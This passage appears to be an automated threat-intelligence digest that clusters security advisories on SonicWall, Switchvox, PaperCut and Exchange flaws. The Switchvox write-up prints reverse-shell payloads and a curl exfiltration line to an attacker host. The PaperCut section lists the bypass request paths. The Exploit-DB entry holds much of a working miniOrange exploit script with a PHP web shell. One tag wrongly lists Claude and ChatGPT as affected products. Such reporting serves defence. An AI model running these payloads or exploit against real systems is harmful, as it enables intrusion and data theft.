Back to Blog Vulnerabilities and Exploits Critical SonicWall SMA1000 Vulnerabilities CVE-2026-83548, CVE-2026-83549 Exploited in the Wild Rapid7 Sep 2, 2026 | Last updated on Sep 3, 2026 | 3 min read Overview On September 1, 2026, SonicWall disclosed two vulnerabilities affecting SonicWall SMA1000 appliances that the vendor says are being actively exploited in the wild. The vulnerabilities, CVE-2026-83548 and CVE-2026-83549 , can be chained to achieve unauthenticated remote code execution (RCE) on affected appliances. CVE-2026-83548 is a critical pre-authentication server-side request forgery (SSRF) vulnerability in the SMA1000 Appliance Work Place interface. The flaw has a CVSS v3.1 base score of 10.0 and can allow a remote, unauthenticated attacker to access sensitive functionality and perform unauthorized operations through an unintended alternate access path. CVE-2026-83549 is a high-severity OS command injection vulnerability in the Appliance Management Console (AMC). On its own, exploitation requires an authenticated administrator and specific system conditions. Although, by leveraging the SSRF vulnerability CVE-2026-83548 an attacker could potentially exploit CVE-2026-83549 to execute arbitrary OS commands without prior authentication. SonicWall SMA1000 appliances are enterprise secure remote access gateways used to provide employees and other authorized users with access to internal applications and resources. Their role as network-edge systems makes successful exploitation particularly concerning, since affected Work Place interfaces may be exposed directly to the internet as part of normal deployment. SonicWall has confirmed active exploitation of both vulnerabilities in the wild, and both CVE-2026-83548 and CVE-2026-83549 have been added to CISA's Known Exploited Vulnerabilities ( KEV ) catalog. No public proof-of-concept exploit, indicators of compromise (IOCs), or attribution for the current activity were identified in the research available at the time of publication. The vulnerabilities affect SMA1000 Models - 6210, 7210, 8200v running the following versions: Vulnerable Versions Fixed Versions 12.4.3-03453 platform-hotfix and earlier 12.4.3-03526 (platform-hotfix) and higher versions 12.5.0-02835 platform-hotfix and earlier 12.5.0-02952 (platform-hotfix) and higher versions. Mitigation guidance Organizations operating affected SonicWall SMA1000 appliances should prioritize applying SonicWall’s updated platform hotfixes immediately. Because exploitation was occurring before public disclosure, organizations should not rely solely on patching to determine whether an appliance has already been compromised. SonicWall recommends upgrading affected appliances to: 12.4.3-03526 platform-hotfix , for systems on the 12.4.3 branch 12.5.0-02952 platform-hotfix , for systems on the 12.5.0 branch Affected Product/Component: SonicWall SMA1000 Appliance Work Place and Appliance Management Console Version 12.4.3-03453 platform-hotfix and earlier are affected. Version 12.5.0-02835 platform-hotfix and earlier are affected. SonicWall additionally recommends that customers contact SonicWall Technical Support for assistance reviewing appliances for indicators of compromise. If evidence of compromise is identified, SonicWall recommends: Re-imaging affected hardware appliances or re-deploying affected virtual appliances. Changing all user and administrator passwords. Resetting Time-based One-Time Password (TOTP) tokens. Given the confirmed exploitation of these vulnerabilities, organizations should treat potentially exposed appliances running vulnerable software as a priority for investigation as well as remediation. Please read the SonicWall security advisory for the latest vendor guidance. Rapid7 customers Exposure Command, InsightVM, and Nexpose Exposure Command, InsightVM, and Nexpose customers can assess exposure to CVE-2026-83548 and CVE-2026-83549 in the SMA1000 Appliance series with vulnerability checks expected to be available
```

#### Corroborating sources (6)

- **Rapid7** (offensive_vulnerability_research)
  - Title: Critical SonicWall SMA1000 Vulnerabilities CVE-2026-83548, CVE-2026-83549 Exploited in the Wild
  - Published: 2026-09-02T16:58:45+00:00
  - Link: https://www.rapid7.com/blog/post/etr-critical-sonicwall-sma1000-vulnerabilities-cve-2026-83548-cve-2026-83549-exploited-in-the-wild
  - Summary: Overview On September 1, 2026, SonicWall disclosed two vulnerabilities affecting SonicWall SMA1000 appliances that the vendor says are being actively exploited in the wild. The vulnerabilities, CVE-2026-83548 and CVE-2026-83549 , can be chained to achieve unauthenticated remote code execution (RCE) on affected appliances. CVE-2026-83548 is a critical pre-authentication server-side request forgery (SSRF) vulnerability in the SMA1000 Appliance Work Place interface. The flaw has a CVSS v3.1 base score of 10.0 and can allow a remote, unauthenticated attacker to access sensitive functionality and perform unauthorized operations through an unintended alternate access path. CVE-2026-83549 is a high-severity OS command injection vulnerability in the Appliance Management Console (AMC). On its own, exploitation requires an authenticated administrator and specific system conditions. Although, by leveraging the SSRF vulnerability CVE-2026-83548 an attacker could potentially exploit CVE-2026-83549
- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: SonicWall warns of actively exploited SMA1000 zero-day flaws
  - Published: 2026-09-02T06:39:29+00:00
  - Link: https://www.bleepingcomputer.com/news/security/sonicwall-warns-of-actively-exploited-sma1000-zero-day-flaws/
  - Summary: SonicWall warned customers that threat actors are chaining two new SMA1000 zero-day vulnerabilities in remote code execution attacks. [...]
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: SonicWall SMA 1000 Zero-Days Enable Unauthenticated RCE
  - Published: 2026-09-02T20:43:59+00:00
  - Link: https://www.darkreading.com/vulnerabilities-threats/sonicwall-sma-1000-zero-days-unauthenticated-rce
  - Summary: The exploitation activity follows attacks earlier this summer on two other zero-day vulnerabilities in the vendor's edge devices.
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Hackers Chain Two New SonicWall Zero-Day Vulnerabilities
  - Published: 2026-09-02T09:00:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/hackers-chain-sonicwall-zeroday/
  - Summary: SonicWall has urged customers to patch two new zero-day vulnerabilities being exploited in the wild
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: CISA Adds Seven Exploited Flaws as Attackers Deploy Reverse Shells and Crypto Miners
  - Published: 2026-09-03T05:19:04+00:00
  - Link: https://thehackernews.com/2026/09/cisa-adds-seven-exploited-flaws-as.html
  - Summary: The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Wednesday added seven security flaws to its Known Exploited Vulnerabilities (KEV) catalog after they landed in attackers' crosshairs. The vulnerabilities are as follows - CVE-2026-83548 (CVSS score: 10.0) - A server-side request forgery vulnerability in SonicWall SMA 1000 Appliances that could allow a remote unauthenticated
- **Sophos X-Ops** (detection_response_operations)
  - Title: SonicWall 83548 83549
  - Published: 2026-09-02T00:00:00+00:00
  - Link: https://www.sophos.com/en-us/blog/sonicwall-83548-83549
  - Summary: Categories: Threat Research Tags: advisory, vulnerability, SonicWall

### Cluster 877d4c3772 — score 59

- Title: Off the Hook: Discovering and Observing Active Exploitation of Sangoma Switchvox CVE-2026-9586
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-09-01T10:01:00+00:00
- Link: https://horizon3.ai/attack-research/disclosures/cve-2026-9586-sangoma-switchvox-rce/
- Fetch status: ok
- Member count: 6
- Corroborating source count: 5
- Strong signals: CVE-2026-9586

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- cve_ids: CVE-2025-57819, CVE-2025-64328, CVE-2026-9586
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_1_offensive_research, tier_4_news, tier_5_chatter

#### Primary article taxonomy
- threat_categories: active_exploitation
- cve_ids: CVE-2026-9586, CVE-2025-57819, CVE-2025-64328
- urgency_signals: actively_exploited, preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
Horizon3 researchers discovered CVE-2026-9586, an unauthenticated SQL injection vulnerability in Sangoma Switchvox that leads to remote code execution and is now being actively exploited.
```

#### Full body

```
Off the Hook: Discovering and Observing Active Exploitation of Sangoma Switchvox CVE-2026-9586 Zach Hanley September 1, 2026 Attack Blogs , Attack Research , Disclosures At Horizon3, we’re constantly looking for technologies and applications to perform security audits on that we believe may be targeted by threat actors. In April of 2026, we took a look at the Sangoma ecosystem after several FreeBPX vulnerabilities, CVE-2025-57819 and CVE-2025-64328 , landed on the CISA Known Exploited Vulnerabilities (KEV) catalog . One such application we landed on was Sangoma Switchvox . Switchvox is an enterprise VoIP telephony management solution. It allows organizations to easily configure phone systems to include voicemail, call forwarding, and monitoring and analytics across their enterprise. In total, we reported 12 distinct vulnerabilities in the Switchvox product which have now been patched – the most impactful being an unauthenticated SQL injection leading to remote code execution. This vulnerability was assigned as CVE-2026-9586 and was patched in Switchvox 8.4.0.2 . This blog will cover only CVE-2026-9586 given that we have now observed valid exploitation attempts in the wild. Figure 1. Defused Switchvox Tripwire Tripped CVE-2026-9586: Unauthenticated SQL Injection to Remote Code Execution One of the features of the Switchvox is to allow supported phones to receive notifications for various events like incoming or outgoing calls. The Switchvox application exposes an unauthenticated HTTP endpoint, /pa , and is handled by the PhoneAppsHandler.pm class. Of note, Sangoma Perl-based files are obfuscated to some degree, which we discovered after our autonomous vulnerability research system initially flagged this vulnerability – but an agent had automatically de-obfuscated the source code. Figure 2. Switchvox Obfuscated Perl Handler Taking a look at the vulnerabilities source, when this endpoint receives a request to notify another phone system, it parses an XML message containing specific key-value pairs. The PhoneIP field extracted directly from the XML message and directly concatenated into an unparameterized SQL query. Figure 3. tel_notify() SQL injection sink The full data flow in PhoneAppsHandler.pm : pre_cmd() line 70: POST body read from POSTDATA CGI parameter pre_cmd() line 74: Validated only that body starts with <PolycomIPPhone> – no content sanitization pre_cmd() line 78: Stored as notification_xml, command set to tel_notify tel_notify() line 180: XML parsed via XML::Simple::XMLin() – returns untrusted data structure tel_notify() line 199/210: PhoneIP extracted from parsed XML – NO VALIDATION tel_notify() lines 220-225: PhoneIP concatenated directly into SQL string (single-quoted context) tel_notify() line 226: $db->query(“sql”, $sql) executes the injected payload as PostgreSQL superuser An simple curl based exploit can be crafted like so: Figure 4. Example Exploit And to receive a reverse shell: Figure 5. Reverse shell Indicators of Compromise If SSH access is possible for the device, evidence of the SQL injection payload used can be observed in /var/log/switchvox/db-quirks.log . Figure 6. Example exploit attempt log in db-quirks.log An example excerpt from the above exploitation attempt: SQL: SELECT proposed_extension FROM auto_phone_config WHERE ip_address = ‘10.0.0.1’; COPY (SELECT ”) TO PROGRAM ‘nc 10.0.18.42 4444 -e /bin/bash > /tmp/0d012120ab00297d.txt 2>&1; chmod 644 /tmp/0d012120ab00297d.txt’–‘ AND config_state = ‘configured’ In the Defused Cyber honeypot, the attacker used an initial payload of: nc 176.65.148.184 39323 | sh Notably, you should investigate if the attacker IP of 176.65.148.184 has been observed in any network requests related to the Switchvox device. But soon followed it up with an enumeration command to curl a remote server and exfiltrate the top running processes on the Switchvox: curl -m 10 http://<ATTACKER_IP>/<UNIQUE_EXPLOIT_ATTEMPT_ID>_$({ echo dG9wIC1ibjEgfCBhd2sgJy9eICpQSUQvIHtnZXRsaW5lOyBwcml
```

#### Corroborating sources (5)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: Off the Hook: Discovering and Observing Active Exploitation of Sangoma Switchvox CVE-2026-9586
  - Published: 2026-09-01T10:01:00+00:00
  - Link: https://horizon3.ai/attack-research/disclosures/cve-2026-9586-sangoma-switchvox-rce/
  - Summary: Horizon3 researchers discovered CVE-2026-9586, an unauthenticated SQL injection vulnerability in Sangoma Switchvox that leads to remote code execution and is now being actively exploited.
- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Hackers exploit Sangoma Switchvox flaw to deploy reverse shells
  - Published: 2026-09-02T21:00:13+00:00
  - Link: https://www.bleepingcomputer.com/news/security/hackers-exploit-sangoma-switchvox-flaw-to-deploy-reverse-shells/
  - Summary: Attackers are actively exploiting CVE-2026-9586, an unauthenticated SQL injection vulnerability in the Sangoma Switchvox VoIP platform that can lead to remote code execution. [...]
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Attackers Exploit Critical Switchvox Flaw to Deploy Reverse Shells Without Credentials
  - Published: 2026-09-02T07:08:50+00:00
  - Link: https://thehackernews.com/2026/09/attackers-exploit-critical-switchvox.html
  - Summary: Threat actors are exploiting a severe security vulnerability in Sangoma Switchvox, an enterprise VoIP platform, that could allow unauthenticated remote code execution. The vulnerability in question is CVE-2026-9586 (CVSS score: 9.3), a critical unauthenticated SQL injection vulnerability in Sangoma Switchvox SMB Edition 8.3 (104997) that can allow attackers to remotely execute arbitrary code as
- **Help Net Security** (cyber_news_breach_reporting)
  - Title: Exploitation of Sangoma Switchvox flaw is underway (CVE-2026-9586)
  - Published: 2026-09-02T12:42:26+00:00
  - Link: https://www.helpnetsecurity.com/2026/09/02/exploitation-of-sangoma-switchvox-flaw-underway-cve-2026-9586/
  - Summary: A threat actor is actively targeting internet-exposed Sangoma Switchvox instance through a recently patched SQL injection flaw (CVE-2026-9586), and organizations running them should check for signs of compromise immediately. How CVE-2026-9586 works Switchvox is a VoIP-based unified communications platform built on the open-source Asterisk engine and aimed at small and medium-size businesses. It can be deployed on-premises, in the cloud, or on virtualized infrastructure. CVE-2026-9586, found in Sangoma Switchvox SMB Edition 8.3, allows attackers to … More → The post Exploitation of Sangoma Switchvox flaw is underway (CVE-2026-9586) appeared first on Help Net Security .
- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: Off the Hook: Discovering and Observing Active Exploitation of Sangoma Switchvox CVE-2026-9586
  - Published: 2026-09-01T12:28:03+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1w4aj8x/off_the_hook_discovering_and_observing_active/
  - Summary: submitted by /u/scopedsecurity [link] [comments]

### Cluster 69f95d6a80 — score 50

- Title: PaperCut NG/MF Critical Zero-Day Exploited in the Wild
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-08-28T10:09:12+00:00
- Link: https://www.rapid7.com/blog/post/etr-papercut-ng-mf-critical-zero-day-exploited-in-the-wild
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: CVE-2026-81578, CVE-2026-82078

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ransomware_extortion, zero_day
- affected_industries: education
- cve_ids: CVE-2023-27350, CVE-2026-81578, CVE-2026-82078
- urgency_signals: actively_exploited, emergency_patch, preauth_unauth, zero_day
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day, active_exploitation
- affected_industries: education
- cve_ids: CVE-2026-81578, CVE-2026-82078, CVE-2023-27350
- urgency_signals: actively_exploited, zero_day, emergency_patch
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Overview On August 27, 2026, PaperCut Software published an urgent security advisory stating that it is investigating active exploitation of a vulnerability affecting PaperCut NG and PaperCut MF. PaperCut has confirmed customer incidents and is treating the issue as a security emergency. At the initial time of disclosure, the vulnerability had not been assigned a CVE identifier, and PaperCut had not publicly disclosed a CVSS score, vulnerability class, authentication requirements, or the technical details of the exploit path. However on August 28, the vendor assigned CVE-2026-81578 and CVE-2026-82078 for the two vulnerabilities that make up the exploit chain. CVE ID Description CWE CVSSv4 CVE-2026-81578 Authentication Bypass CWE-306 Missing authentication for critical function. 8.8 (High) CVE-2026-82078 Unsafe Dynamic Class Loading in Database Connector CWE-470 Use of Externally-Controlled input to select classes or code ('unsafe reflection'). 9.4 (Critical) PaperCut NG and PaperCut MF
```

#### Full body

```
Back to Blog Vulnerabilities and Exploits PaperCut NG/MF Critical Zero-Day Exploited in the Wild Rapid7 Aug 28, 2026 | Last updated on Sep 1, 2026 | 6 min read Overview On August 27, 2026, PaperCut Software published an urgent security advisory stating that it is investigating active exploitation of a vulnerability affecting PaperCut NG and PaperCut MF. PaperCut has confirmed customer incidents and is treating the issue as a security emergency. At the initial time of disclosure, the vulnerability had not been assigned a CVE identifier, and PaperCut had not publicly disclosed a CVSS score, vulnerability class, authentication requirements, or the technical details of the exploit path. However on August 28, the vendor assigned CVE-2026-81578 and CVE-2026-82078 for the two vulnerabilities that make up the exploit chain. CVE ID Description CWE CVSSv4 CVE-2026-81578 Authentication Bypass CWE-306 Missing authentication for critical function. 8.8 (High) CVE-2026-82078 Unsafe Dynamic Class Loading in Database Connector CWE-470 Use of Externally-Controlled input to select classes or code ('unsafe reflection'). 9.4 (Critical) PaperCut NG and PaperCut MF are print management platforms commonly deployed within enterprise, education, and other organizational environments. Because the PaperCut Application Server provides web-accessible administrative and application functionality, organizations with servers exposed to the public internet should prioritize remediation and access restriction. PaperCut stated in its advisory that information supplied by a university customer’s security team and digital forensics and incident response team enabled its security response team to reproduce the vulnerability in PaperCut NG and PaperCut MF. On August 28, 2026 at 02:10 AEST, PaperCut released emergency patches for PaperCut NG and PaperCut MF versions 25 and 26, followed later the same day with patches for version 24. PaperCut has been targeted in the past; in 2023, CVE-2023-27350 was broadly exploited in the wild by multiple threat-actor groups, including ransomware operators. This prior history increases the urgency organizations should address this new zero-day with. PaperCut currently considers all versions of PaperCut NG and PaperCut MF potentially impacted. Customers operating internet-accessible PaperCut Application Servers should take immediate action even if no suspicious activity has been observed. On August 31, 2026, both CVE-2026-81578 and CVE-2026-82078 were added to the U.S. Cybersecurity and Infrastructure Security Agency’s (CISA) list of known exploited vulnerabilities (KEV), based on evidence of active exploitation. A Metasploit module is now available to validate exposure to the exploit chain. Technical overview The vulnerability is an authentication bypass that lets attackers invoke privileged PaperCut components. This can be leveraged to reconfigure an external database lookup. When this lookup is triggered, malicious SQL can be executed, resulting in remote code execution. PaperCut uses the Apache Tapestry framework, whose "complex direct" request format can identify one page to display and a different page containing the component to execute. PaperCut validates access only to the displayed page. By selecting either the public Error page or Exception page for display, an attacker can bypass authentication while invoking administrative components belonging to ConfigEditor or UserList . Additionally, the first emergency patch could be bypassed by using the Home page for display, however the newest version of the vendor patch correctly remediates this bypass. The attack uses HTTP POST requests to the following URIs (Note that the path segment with the value 1 shown below can be any value for this path segment, and the Error path segment may also be the Exception or Home path segment): /app?service=direct/1/Error/ConfigEditor/quickFindForm /app?service=direct/1/Error/ConfigEditor/$Form /app?service=direct/1/Error/UserList/$QuickFind.$F
```

#### Corroborating sources (2)

- **Rapid7** (offensive_vulnerability_research)
  - Title: PaperCut NG/MF Critical Zero-Day Exploited in the Wild
  - Published: 2026-08-28T10:09:12+00:00
  - Link: https://www.rapid7.com/blog/post/etr-papercut-ng-mf-critical-zero-day-exploited-in-the-wild
  - Summary: Overview On August 27, 2026, PaperCut Software published an urgent security advisory stating that it is investigating active exploitation of a vulnerability affecting PaperCut NG and PaperCut MF. PaperCut has confirmed customer incidents and is treating the issue as a security emergency. At the initial time of disclosure, the vulnerability had not been assigned a CVE identifier, and PaperCut had not publicly disclosed a CVSS score, vulnerability class, authentication requirements, or the technical details of the exploit path. However on August 28, the vendor assigned CVE-2026-81578 and CVE-2026-82078 for the two vulnerabilities that make up the exploit chain. CVE ID Description CWE CVSSv4 CVE-2026-81578 Authentication Bypass CWE-306 Missing authentication for critical function. 8.8 (High) CVE-2026-82078 Unsafe Dynamic Class Loading in Database Connector CWE-470 Use of Externally-Controlled input to select classes or code ('unsafe reflection'). 9.4 (Critical) PaperCut NG and PaperCut MF
- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: CVE-2026-81578 + CVE-2026-82078 | PaperCut NG/MF Authentication Bypass and Unsafe Dynamic Class Loading Vulnerabilities
  - Published: 2026-09-01T15:31:20+00:00
  - Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-81578-cve-2026-82078/
  - Summary: CVE-2026-81578 and CVE-2026-82078 can be chained to achieve unauthenticated remote code execution in PaperCut NG/MF. NodeZero® Rapid Response safely validates whether the attack chain is exploitable.

### Cluster 220df2cac2 — score 33

- Title: PaperCut Zero-Day: Active Exploitation and Pre-Auth RCE
- Source: Huntress (detection_response_operations)
- Published: 2026-08-28T03:00:00+00:00
- Link: https://www.huntress.com/blog/papercut-actively-exploited
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- affected_industries: critical_infrastructure
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- cve_ids: CVE-2026-81578, CVE-2026-82078
- urgency_signals: actively_exploited, emergency_patch, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- affected_industries: critical_infrastructure
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- cve_ids: CVE-2026-81578, CVE-2026-82078
- urgency_signals: actively_exploited, zero_day, preauth_unauth, emergency_patch
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
PaperCut NG and PaperCut MF are under active exploitation. Huntress reproduced a pre-auth RCE chain and shares urgent patching, exposure, and detection guidance.
```

#### Full body

```
Home Blog PaperCut Actively Exploited: A Pre-Auth RCE Chain Published: August 28, 2026 PaperCut Actively Exploited: A Pre-Auth RCE Chain By: John Hammond Andrew Brandt Summarize with AI Summarize ChatGPT Claude Perplexity Google AI Key Takeaways In an August 27 security advisory, PaperCut said attackers are actively exploiting a pre-authentication remote code execution vulnerability against PaperCut NG and PaperCut MF, with confirmed customer incidents. Huntress has found evidence of exploitation in two customer environments. Observed activity focused on system discovery. We have not observed secondary malware, further command-and-control traffic, or additional persistence or post-exploitation from the recovered payload. Huntress reproduced a full pre-authentication RCE chain against a vanilla PaperCut NG 25.0.11.75758 server. We have reached out to PaperCut to coordinate with them on continued vulnerability analysis. Emergency patches are available for PaperCut NG and PaperCut MF major versions 24, 25, and 26. Whether or not you can patch immediately, it is strongly recommended to remove the application server from public-facing internet connections and limit access to trusted networks. Acknowledgements : Special thanks to Tanner Filip, Jai Minton, Max Rogers, Ben Nahorney, Lindsey Welch, Susannah Matt, Aaron Deal, Dray Agha, Lindon Wass, Michael Elford, and Craig Sweeney for their contributions to this investigation and writeup. Update: 9/1/26 @ 8:15AM ET PaperCut has announced Release 3 for PaperCut NG and PaperCut MF, a third emergency patch that supersedes Release 2, meaning you do not need to install the other two releases first. If you already installed either of the original emergency patches, PaperCut recommends installing Release 3 as well. Along with additional hardening and mitigation, Release 3 addresses broken SAML login flows and restores support for using legacy Microsoft SQL Server drivers for external card lookup. The PaperCut team also published a behind-the-scenes blog post breaking down how the incident unfolded from their perspective. Update: 8/28/26 @ 2:45PM ET PaperCut has released a second emergency patch, referred to as Release 2, for PaperCut NG and PaperCut MF. If you already installed the original emergency patch, PaperCut recommends installing Release 2 as well. Organizations should follow PaperCut's urgent security advisory for the latest supported builds and installation guidance. PaperCut has also assigned two CVEs to the vulnerabilities involved in this attack chain: CVE-2026-81578 is an improper access control vulnerability in the web management interface that can allow an unauthenticated attacker to modify system configurations. CVE-2026-82078 is an unsafe dynamic class-loading vulnerability in the database connection utilities that can be used to execute arbitrary Java bytecode. Chained together these flaws enable pre-authentication remote code execution in the PaperCut Application Server. Background On August 27, PaperCut published an urgent security advisory warning that a vulnerability in their print management software, PaperCut NG and MF, were being exploited in the wild. This vulnerability gives an unauthenticated attacker remote control over PaperCut's trusted configuration, which could be used to execute arbitrary Java code inside the Application Server process. PaperCut currently treats all NG and MF versions as potentially affected, and has released emergency patches for versions 25 and 26 (version 24 fixes are still in progress). Organizations that have PaperCut NG and MF in their environment should remove public exposure immediately and apply PaperCut's emergency update for versions 25 or 26. For version 25 on Windows, the emergency builds are: PaperCut NG 25.0.12.76497 PaperCut MF 25.0.12.76496 Huntress has seen limited exploitation on two customer environments; post-exploitation activity included base64-encoded commands executed on the targeted server that decoded to commands
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: PaperCut Zero-Day: Active Exploitation and Pre-Auth RCE
  - Published: 2026-08-28T03:00:00+00:00
  - Link: https://www.huntress.com/blog/papercut-actively-exploited
  - Summary: PaperCut NG and PaperCut MF are under active exploitation. Huntress reproduced a pre-auth RCE chain and shares urgent patching, exposure, and detection guidance.

### Cluster d5d207ddf7 — score 22

- Title: [webapps] miniOrange 5.4.3 - Unauthenticated Auth Bypass
- Source: Exploit-DB (offensive_vulnerability_research)
- Published: 2026-09-01T00:00:00+00:00
- Link: https://www.exploit-db.com/exploits/52668
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_products: WordPress
- cve_ids: CVE-2026-15013
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- affected_products: WordPress
- cve_ids: CVE-2026-15013
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
miniOrange 5.4.3 - Unauthenticated Auth Bypass
```

#### Full body

```
Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training miniOrange 5.4.3 - Unauthenticated Auth Bypass EDB-ID: 52668 CVE: 2026-15013 EDB Verified: Author: zer0dayf Type: webapps Exploit: / Platform: Multiple Date: 2026-09-01 Vulnerable App: # Exploit Title: miniOrange 5.4.3 - Unauthenticated Auth Bypass # Google Dork: inurl:/wp-content/plugins/miniorange-saml-20-single-sign-on/ # Date: 2026-07-27 # Exploit Author: zer0dayf # Vendor Homepage: https://plugins.wordpress.org/miniorange-saml-20-single-sign-on/ # Software Link: https://downloads.wordpress.org/plugin/miniorange-saml-20-single-sign-on.5.4.3.zip # Version: <= 5.4.3 # Tested on: WordPress 7.x + miniOrange SAML SSO 5.4.3 # CVE : CVE-2026-15013 """ CVE-2026-15013 — miniOrange SAML SSO <= 5.4.3 HMAC signature algorithm confusion Lab / authorized testing only. Flow: detect → enum users → fetch IdP cert → HMAC SAML → admin → shell → optional reverse """ from __future__ import annotations import argparse import base64 import hashlib import hmac import io import os import re import subprocess import sys import tempfile import uuid import zipfile from datetime import datetime, timedelta, timezone from pathlib import Path from urllib.parse import urlparse import requests from lxml import etree requests.packages.urllib3.disable_warnings() NS_SAMLP = "urn:oasis:names:tc:SAML:2.0:protocol" NS_SAML = "urn:oasis:names:tc:SAML:2.0:assertion" NS_DS = "http://www.w3.org/2000/09/xmldsig#" C14N = "http://www.w3.org/2001/10/xml-exc-c14n#" ENVSIG = "http://www.w3.org/2000/09/xmldsig#enveloped-signature" HMAC_URI = "http://www.w3.org/2000/09/xmldsig#hmac-sha1" SHA1_URI = "http://www.w3.org/2000/09/xmldsig#sha1" PLUGIN_PATH = "/wp-content/plugins/miniorange-saml-20-single-sign-on/" VULN_MAX = (5, 4, 3) SHELL_PHP = r"""<?php /** * Plugin Name: exp * Version: 1.0 */ if (!isset($_GET["c"])) { header("Content-Type: text/plain"); echo "exp cmd shell\nUsage: ?c=id\n"; exit; } $c = $_GET["c"]; header("Content-Type: text/plain; charset=utf-8"); echo ">>> " . $c . "\n\n"; if (function_exists("shell_exec")) { echo shell_exec($c . " 2>&1"); } else { echo "no shell_exec\n"; } """ def norm(url: str) -> str: url = url.strip().rstrip("/") if not url.startswith(("http://", "https://")): url = "http://" + url return url def ver_tuple(s: str): try: return tuple(int(x) for x in s.split(".")[:3]) except Exception: return (0, 0, 0) def now_iso(m=0): return (datetime.now(timezone.utc) + timedelta(minutes=m)).strftime("%Y-%m-%dT%H:%M:%SZ") def session(): s = requests.Session() s.verify = False s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" return s def is_wp(s, base): for p in ("/wp-login.php", "/wp-json/", "/wp-includes/js/jquery/jquery.min.js"): try: if s.get(base + p, timeout=10).status_code == 200: return True except Exception: pass return False def detect_plugin(s, base): try: r = s.get(base + PLUGIN_PATH + "readme.txt", timeout=10) if r.status_code == 200: m = re.search(r"Stable tag:\s*(\S+)", r.text) if m: return m.group(1) except Exception: pass return None def discover_sp(s, base): acs, eid, issuer = base + "/", base + PLUGIN_PATH, "" try: r = s.get(base + "/?option=mosaml_metadata", timeout=12) if r.status_code == 200 and "EntityDescriptor" in r.text: m = re.search(r'entityID="([^"]+)"', r.text) if m: eid = m.group(1) m = re.search(r'Location="([^"]+)"', r.text) if m: acs = m.group(1) except Exception: pass try: r = s.get(base + "/?option=saml_user_login", timeout=12, allow_redirects=False) if r.status_code in (301, 302, 303, 307): loc = r.headers.get("Location", "") pu = urlparse(loc) if pu.scheme and pu.netloc: issuer = f"{pu.scheme}://{pu.netloc}" parts = [x for x in pu.path.split("/") if x] if "realms" in parts: i = parts.index("realms") if i + 1 < len(parts): issuer = f"{pu.scheme}://{pu.netloc}/realms/{parts[i + 1]}" except Exception: pass return acs, eid,
```

#### Corroborating sources (1)

- **Exploit-DB** (offensive_vulnerability_research)
  - Title: [webapps] miniOrange 5.4.3 - Unauthenticated Auth Bypass
  - Published: 2026-09-01T00:00:00+00:00
  - Link: https://www.exploit-db.com/exploits/52668
  - Summary: miniOrange 5.4.3 - Unauthenticated Auth Bypass

### Cluster 535b833320 — score 21

- Title: Nearly 22,000 Microsoft Exchange servers remain exposed to critical security flaw (CVE-2026-62911)
- Source: Help Net Security (cyber_news_breach_reporting)
- Published: 2026-09-02T13:24:09+00:00
- Link: https://www.helpnetsecurity.com/2026/09/02/microsoft-exchange-cve-2026-62911-critical-authentication-bypass-flaw/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-62911

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- affected_industries: government
- cve_ids: CVE-2026-42897, CVE-2026-62911
- urgency_signals: actively_exploited, no_patch_yet, zero_day
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- affected_industries: government
- cve_ids: CVE-2026-62911, CVE-2026-42897
- urgency_signals: actively_exploited, zero_day, no_patch_yet
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
Nearly 22,000 Microsoft Exchange servers remain unpatched against CVE-2026-62911, a critical authentication bypass vulnerability, according to daily scans from the Shadowserver Foundation. The United States and Germany top the list with 6,200 and 5,100 unpatched servers. CVE-2026-62911 is a critical severity vulnerability, and Microsoft describes it as “authentication bypass by capture-replay in Microsoft Exchange Server,” which allows an authorized attacker to elevate privileges over a network. Microsoft released the fix on August 11, 2026, and … More → The post Nearly 22,000 Microsoft Exchange servers remain exposed to critical security flaw (CVE-2026-62911) appeared first on Help Net Security .
```

#### Full body

